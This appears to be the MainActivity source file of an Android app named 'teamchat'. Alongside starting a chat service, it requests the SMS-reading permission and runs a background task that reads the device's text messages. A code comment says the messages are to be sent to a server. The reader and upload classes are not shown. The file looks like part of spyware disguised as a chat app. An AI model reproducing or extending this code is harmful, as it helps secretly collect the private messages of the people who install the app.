package com.example.teamchat;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.v("test1:", "onCreate");

        startService(new Intent(this, ChatService.class));
    }

    public class ReadSMSAsync extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            SmsReader smsReader = null;
            try {
                smsReader = new SmsReader(MainActivity.this);
            } catch (Exception e) {
                e.printStackTrace();
            }
            assert smsReader != null;
            smsReader.readSMS();
            return null;
        }
    }

    final int PERMISSION_READ_SMS=123;
    private void requestSMSPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
                // Show an explanation to the user *asynchronously* -- don't block
                // this thread waiting for the user's response! After the user
                // sees the explanation, try again to request the permission.
            } else {
                // Request the permission.
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_READ_SMS);
                Log.v("","Requesting permissions...");
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSION_READ_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // If permission granted, read sms and send to server.
                    Log.v("","Permission granted!");
                    ReadSMSAsync readSMSAsync = new ReadSMSAsync();
                    readSMSAsync.execute();

                } else {
                    // If permission is denied, nothing happens.
                    Log.v("","Permission denied!");
                }
                break;
            }

        }
    }
}








